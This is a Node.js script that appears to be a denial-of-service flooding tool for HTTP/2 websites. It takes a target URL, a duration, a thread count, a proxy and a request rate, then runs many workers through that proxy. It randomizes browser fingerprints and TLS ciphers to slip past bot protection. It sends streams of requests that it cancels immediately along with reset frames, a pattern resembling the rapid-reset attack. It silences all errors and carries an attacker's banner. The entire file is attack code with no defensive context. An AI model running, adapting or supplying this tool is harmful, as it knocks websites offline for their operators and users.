const url = require('url')
	, fs = require('fs')
	, http2 = require('http2')
	, http = require('http')
	, tls = require('tls')
	, net = require('net')
	, request = require('request')
	, cluster = require('cluster')
const crypto = require('crypto');
const HPACK = require('hpack');
const currentTime = new Date();
const os = require("os");
const httpTime = currentTime.toUTCString();






const errorHandler = error => {
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}
cplist = [
		'TLS_AES_128_CCM_8_SHA256',
		'TLS_AES_128_CCM_SHA256',
		'TLS_CHACHA20_POLY1305_SHA256',
		'TLS_AES_256_GCM_SHA384',
		'TLS_AES_128_GCM_SHA256'
		, ]
const sigalgs = [
	'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512'
	, 'ecdsa_brainpoolP256r1tls13_sha256'
	, 'ecdsa_brainpoolP384r1tls13_sha384'
	, 'ecdsa_brainpoolP512r1tls13_sha512'
	, 'ecdsa_sha1'
	, 'ed25519'
	, 'ed448'
	, 'ecdsa_sha224'
	, 'rsa_pkcs1_sha1'
	, 'rsa_pss_pss_sha256'
	, 'dsa_sha256'
	, 'dsa_sha384'
	, 'dsa_sha512'
	, 'dsa_sha224'
	, 'dsa_sha1'
	, 'rsa_pss_pss_sha384'
	, 'rsa_pkcs1_sha2240'
	, 'rsa_pss_pss_sha512'
	, 'sm2sig_sm3'
	, 'ecdsa_secp521r1_sha512'
, ];
let sig = sigalgs.join(':');

controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400']
	, ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError']
	, ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
const headerFunc = {
	cipher() {
		return cplist[Math.floor(Math.random() * cplist.length)];
	}
, }

process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);

const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
const rps = process.argv[6];
if (!/^https?:\/\//i.test(target)) {
	console.error('sent with http:// or https://');
	process.exit(1);
}
proxyr = proxyFile
if (isNaN(rps) || rps <= 0) {
	console.error('number rps');
	process.exit(1);
}
const MAX_RAM_PERCENTAGE = 85;
const RESTART_DELAY = 100;
if (cluster.isMaster) {
  console.log("@CRISXTOP".bgRed);
	for (let counter = 1; counter <= thread; counter++) {
		cluster.fork();
	}
	const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script via', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage percentage exceeded:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
	setInterval(handleRAMUsage, 5000);
	setTimeout(() => process.exit(-1), time * 1000);
} else {
	setInterval(flood)
}

function flood() {
	var parsed = url.parse(target);
	var cipper = headerFunc.cipher();
	var proxy = proxyr.split(':');
	
	function randstra(length) {
		const characters = "0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}

	function randstr(minLength, maxLength) {
		const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
const randomStringArray = Array.from({ length }, () => {
const randomIndex = Math.floor(Math.random() * characters.length);
return characters[randomIndex];
});

return randomStringArray.join('');
}

	const randstrsValue = randstr(25);
function generateRandomString(minLength, maxLength) {
					const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });

  return randomStringArray.join('');
}
const hd = {}
 function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
   const secdata = {
				"sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
			  }
           const secdata2 = {"sec-fetch-site": "none"}
           
           
           const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx"];
const getRandomBrowser = () => {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
};
const generateHeaders = (browser) => {
    const versions = {
        chrome: { min: 118, max: 126 },
        safari: { min: 12, max: 16 },
        brave: { min: 115, max: 124 },
        firefox: { min: 99, max: 112 },
        mobile: { min: 85, max: 105 },
        opera: { min: 70, max: 90 },
        operagx: { min: 70, max: 90 }
    };

    const version = Math.floor(Math.random() * (versions[browser].max - versions[browser].min + 1)) + versions[browser].min;
    const fullVersions = {
        brave: "90.0.4430.212",
        chrome: "90.0.4430.212",
        firefox: "88.0",
        safari: "14.1",
        mobile: "90.0.4430.212",
        opera: "90.0.4430.212",
        operagx: "90.0.4430.212"
    };

    // T?o header "Sec-CH-UA-Full-Version-List" t? gi? tr? full version
    const secChUAFullVersionList = Object.keys(fullVersions)
        .map(key => `"${key}";v="${fullVersions[key]}"`)
        .join(", ");
    const platforms = {
        chrome: "Win64",
        safari: "macOS",
        brave: "Linux",
        firefox: "Linux",
        mobile: "Android",
        opera: "Linux",
        operagx: "Linux"
    };
    const platform = platforms[browser];
    const secChUaMobile = browser === "mobile" ? "?1" : "?0";
    const acceptEncoding = Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br";
    const accept = Math.random() < 0.5 ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" : "application/json";
    const headersMap = {
        brave: {
            ":method": "GET",
            ":authority":parsed.host,
            ":scheme": "https",
            ":path": parsed.path,
            "sec-ch-ua": `Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": `${secChUaMobile}`,
            "accept": `${accept}`,
            "Pragma": "no-cache",
            
            'user-agent': process.argv[8],
            'cookie' :process.argv[7] ,
            ...(Math.random() < 0.5 ? secdata2: {}),
            ...(Math.random() < 0.5 ? secdata :{}),
            "accept-encoding": `${acceptEncoding}`,
            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.brave
        },
        chrome: {
            ":method": "GET",
            ":authority":parsed.host,
            ":scheme": "https",
            ":path": parsed.path,
            "sec-ch-ua": `"Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": `${secChUaMobile}`,
            "accept": `${accept}`,
            "Pragma": "no-cache",
            
            'user-agent': process.argv[8],
            'cookie' :process.argv[7] ,
            ...(Math.random() < 0.5 ? secdata2: {}),
            ...(Math.random() < 0.5 ? secdata :{}),
            "accept-encoding": `${acceptEncoding}`,
            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.chrome
        },
        firefox: {
            ":method": "GET",
            ":authority":parsed.host,
            ":scheme": "https",
            ":path": parsed.path,
            "sec-ch-ua": `"Firefox";v="${version}", "Gecko";v="20100101", "Mozilla";v="${version}"`,
            "sec-ch-ua-mobile": `${secChUaMobile}`,
            "accept": `${accept}`,
            "Pragma": "no-cache",
            
            'user-agent': process.argv[8],
            'cookie' :process.argv[7] ,
           ...(Math.random() < 0.5 ? secdata2: {}),
            ...(Math.random() < 0.5 ? secdata :{}),
            "accept-encoding": `${acceptEncoding}`,
            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.firefox
        },
        safari: {
            ":method": "GET",
            ":authority":parsed.host,
            ":scheme": "https",
            ":path": parsed.path,
            "sec-ch-ua": `"Safari";v="${version}", "AppleWebKit";v="605.1.15", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": `${secChUaMobile}`,
            "accept": `${accept}`,
            "Pragma": "no-cache",
            
            'user-agent': process.argv[8],
            'cookie' :process.argv[7] ,
            ...(Math.random() < 0.5 ? secdata2: {}),
            ...(Math.random() < 0.5 ? secdata :{}),
            "accept-encoding": `${acceptEncoding}`,
            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.safari
        },
        mobile: {
            ":method": "GET",
            ":authority":parsed.host,
            ":scheme": "https",
            ":path": parsed.path,
            "sec-ch-ua": `"Chromium";v="${version}", "Mobile";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": `${secChUaMobile}`,
            "accept": `${accept}`,
            "Pragma": "no-cache",
           
            'user-agent': process.argv[8],
            'cookie' :process.argv[7] ,
            ...(Math.random() < 0.5 ? secdata2: {}),
            ...(Math.random() < 0.5 ? secdata :{}),
            "accept-encoding": `${acceptEncoding}`,
            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.mobile
        },
        opera: {
            ":method": "GET",
            ":authority":parsed.host,
            ":scheme": "https",
            ":path": parsed.path,
            "sec-ch-ua": `"Chromium";v="${version}", "Opera";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": `${secChUaMobile}`,
            "accept": `${accept}`,
            "Pragma": "no-cache",
            
            'user-agent': process.argv[8],
            'cookie' :process.argv[7] ,
            ...(Math.random() < 0.5 ? secdata2: {}),
            ...(Math.random() < 0.5 ? secdata :{}),
            "accept-encoding": `${acceptEncoding}`,
            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.opera
        },
        operagx: {
            ":method": "GET",
            ":authority":parsed.host,
            ":scheme": "https",
            ":path": parsed.path,
            "sec-ch-ua": `"Chromium";v="${version}", "Opera GX";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": `${secChUaMobile}`,
            "accept": `${accept}`,
            "Pragma": "no-cache",
            
            'user-agent': process.argv[8],
            'cookie' :process.argv[7] ,
            ...(Math.random() < 0.5 ? secdata2: {}),
            ...(Math.random() < 0.5 ? secdata :{}),
            "accept-encoding": `${acceptEncoding}`,
           "accept-language": "ru,en-US;q=0.9,en;q=0.8",
           "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.operagx
        }
    };

    return headersMap[browser];
};
const browser = getRandomBrowser();
const headers = generateHeaders(browser);
	const agent = new http.Agent({
		host: proxy[0]
		, port: proxy[1]
		, keepAlive: true
		, keepAliveMsecs: 500000000
		, maxSockets: 50000
		, maxTotalSockets: 100000
	, });
	const Optionsreq = {
		agent: agent
		, method: 'CONNECT'
		, path: parsed.host + ':443'
		, timeout: 1000
		, headers: {
			'Host': parsed.host
			, 'Proxy-Connection': 'Keep-Alive'
			, 'Connection': 'Keep-Alive'
		, }
	, };
	connection = http.request(Optionsreq, (res) => {});
	const TLSOPTION = {
		ciphers: cipper
		, secureProtocol: ["TLSv1_3_method"]
		, sigals: sig
		, secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom
		, echdCurve: "X25519"
		, secure: true
		, rejectUnauthorized: false
		, ALPNProtocols: ['h2']
	, };

	function createCustomTLSSocket(parsed, socket) {
    const tlsSocket = tls.connect({
			...TLSOPTION
			, host: parsed.host
			, port: 443
			, servername: parsed.host
			, socket: socket
		});
		tlsSocket.setKeepAlive(true, 600000);
    tlsSocket.allowHalfOpen = true;
    tlsSocket.setNoDelay(true);
    tlsSocket.setMaxListeners(0);

    return tlsSocket;
}
 function taoDoiTuongNgauNhien() {
  const doiTuong = {};
  function getRandomNumber(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
maxi = getRandomNumber(1,4)
  for (let i = 1; i <=maxi ; i++) {
    
    
 const key = 'custom-sec-'+ generateRandomString(1,9)

    const value =  generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)

    doiTuong[key] = value;
  }

  return doiTuong;
}
	 function shuffleObject(obj) {
					const keys = Object.keys(obj);
				  
					for (let i = keys.length - 1; i > 0; i--) {
					  const j = Math.floor(Math.random() * (i + 1));
					  [keys[i], keys[j]] = [keys[j], keys[i]];
					}
				  
					const shuffledObject = {};
					for (const key of keys) {
					  shuffledObject[key] = obj[key];
					}
				  
					return shuffledObject;
				  }
	connection.on('connect', function (res, socket) {
    const tlsSocket = createCustomTLSSocket(parsed, socket);
    socket.setKeepAlive(true, 100000);

    let clasq = shuffleObject({
        ...(Math.random() < 0.5 ? { headerTableSize: 65536 } : {}),
        ...(Math.random() < 0.5 ? { maxConcurrentStreams: 1000 } : {}),
        enablePush: false,
        enableConnectProtocol: false,
        ...(Math.random() < 0.5 ? { initialWindowSize: 6291456 } : {}),
        ...(Math.random() < 0.5 ? { maxHeaderListSize: 262144 } : {}),
        ...(Math.random() < 0.5 ? { maxFrameSize: 16384 } : {})
    });

    let hpack = new HPACK();
    


    const clients = [];
    const client = http2.connect(parsed.href, {
		
		settings: clasq,
    "unknownProtocolTimeout": 10,
    "maxReservedRemoteStreams": 1000,
    "maxSessionMemory": 100,
   createConnection: () => tlsSocket
	});
clients.push(client);
client.setMaxListeners(0);
const updateWindow = Buffer.alloc(4);
    updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);
    client.on('remoteSettings', (settings) => {
        const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
        client.setLocalWindowSize(localWindowSize, 0);
    });
    client.on('connect', () => {
        client.ping((err, duration, payload) => {
            if (err) {
            } else {
            }
        });
        client.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('NATRAL'));
        
    });

    clients.forEach(client => {
        const intervalId = setInterval(async () => {
            const requests = [];
            let count = 0;
            let threadvalue = 0;
            
                let dynHeaders = shuffleObject({
                    ...taoDoiTuongNgauNhien(),
                    ...taoDoiTuongNgauNhien(),
                });

                const head = {
                    ...dynHeaders,
                    ...headers,
                };
                const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('');
                threadvalue += 1
                if (threadvalue == 1) {
                                head["sec-ch-ua"] = `${randomString}`;
                                head["dnt"] = "1";
                            } else if (threadvalue == 2) {
                                head["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                                head["sec-ch-ua-mobile"] = `${randomString}`;
                            } else if (threadvalue == 3) {
                                head["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                                head["sec-ch-ua-platform"] = `${randomString}`;
                            } else if (threadvalue == 4) {
                                head["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                                
                                head["upgrade-insecure-requests"] = `${randomString}`;
                            } else if (threadvalue === 5) {
                                head["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                                
                                head["sec-ch-ua-platform"] = `"Windows"`;
                                head["upgrade-insecure-requests"] = "1";
                            } else if (threadvalue === 6) {
                                head["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                                head["dnt"] = "1";                                
                                head["upgrade-insecure-requests"] = "1";
                                head["accept"] = `${randomString}`;
                            } else if (threadvalue === 7) {
                                head["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                                
                                head["upgrade-insecure-requests"] = "1";
                                head["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                                head["sec-fetch-site"] = `${randomString}`;
                            } else if (threadvalue === 8) {
                                head["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                                
                                head["upgrade-insecure-requests"] = "1";
                                head["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                                head["sec-fetch-site"] = "none";
                                head["sec-fetch-mode"] = `${randomString}`;
                            } else if (threadvalue === 9) {
                                head["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                                
                                head["upgrade-insecure-requests"] = "1";
                                head["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                                head["sec-fetch-site"] = "none";
                                head["sec-fetch-mode"] = "navigate";
                                head["sec-fetch-user"] = `${randomString}`;
                            } else if (threadvalue === 10) {
                                head["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                                head["dnt"] = "1";
                                
                                head["upgrade-insecure-requests"] = "1";
                                
                                head["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                                head["sec-fetch-site"] = "none";
                                head["sec-fetch-mode"] = "navigate";
                                head["sec-fetch-user"] = "?1";
                                head["sec-fetch-dest"] = `${randomString}`;
                            } else if (threadvalue === 11) {
                                head["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                                head["Accept-Language"] = "en-US";
                                head["upgrade-insecure-requests"] = "1";
                                
                                head["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                                head["sec-fetch-site"] = "none";
                                head["sec-fetch-mode"] = "navigate";
                                head["sec-fetch-user"] = "?1";
                                head["sec-fetch-dest"] = "document";
                                head["accept-encoding"] = `${randomString}`;
                            } else if (threadvalue === 12) {
                                head["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                                head["sec-ch-ua-mobile"] = "?0";
                                head["sec-ch-ua-platform"] = `"Windows"`;
                                head["upgrade-insecure-requests"] = "1";
                                head["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                                head["sec-fetch-site"] = "none";
                                head["sec-fetch-mode"] = "navigate";
                                head["sec-fetch-user"] = "?1";
                                head["sec-fetch-dest"] = "document";
                                head["accept-encoding"] = "gzip, deflate, br, zstd";
                                threadvalue = 0;
                            }
                            
                if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                for (let i = 0; i < rps; i++) {
                const requestPromise = new Promise((resolve, reject) => {
                    const request = client.request(head, {
                        weight: Math.random() < 0.5 ? 251 : 231,
                        depends_on: 0,
                        exclusive: Math.random() < 0.5 ? true : false,
                    });
                    request.on('response', () => {
                    request.close(http2.constants.NGHTTP2_CANCEL);
                    request.destroy(); // H?y y�u c?u v� gi?i ph�ng t�i nguy�n
                    resolve();
                      });
                    
                    request.on('end', () => {
                    count++;
                    if (count === time * rps) {
                    clearInterval(intervalId);
                    client.close(http2.constants.NGHTTP2_CANCEL);
                    }
                    reject(new Error('Request timed out'));
                    });
                    request.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
                });

                const packed = Buffer.concat([
                    Buffer.from([0x80, 0, 0, 0, 0xFF]),
                    hpack.encode(head)
                ]);

                let streamId =1;
                let streamIdReset = 1;
                const flags = 0x1 | 0x4 | 0x8 | 0x20;
                
                
                const encodedFrame = encodeFrame(streamId, 1, packed, flags);
                
                const frame = Buffer.concat([encodedFrame]);
                if (streamIdReset >= 5 && (streamIdReset - 5) % 10 === 0) {
                tlsSocket.write(Buffer.concat([encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0)]));
                }
              
                streamIdReset += 2;
                streamId += 2;
                requests.push({ requestPromise, frame });
            }
            try {
                await Promise.all(requests.map(({ requestPromise }) => requestPromise));
            } catch (error) {
            }
                }
                
        }, 500);
        

      
    });

		
		client.on("close", () => {
			client.destroy();
			tlsSocket.destroy();
			socket.destroy();
			return 
		});




client.on("error", error => {
    if (error.code === 'ERR_HTTP2_GOAWAY_SESSION') {
        console.log('Received GOAWAY error, pausing requests for 10 seconds\r');
        shouldPauseRequests = true;
        setTimeout(() => {
           
            shouldPauseRequests = false;
        },2000);
    } else if (error.code === 'ECONNRESET') {
        
        shouldPauseRequests = true;
        setTimeout(() => {
            
            shouldPauseRequests = false;
        }, 2000);
    }  else {
    }

    client.destroy();
			tlsSocket.destroy();
			socket.destroy();
			return
});

	});


	connection.on('error', (error) => {
		connection.destroy();
		if (error) return;
	});
	connection.on('timeout', () => {
		connection.destroy();
		return
	});
	connection.end();
}//

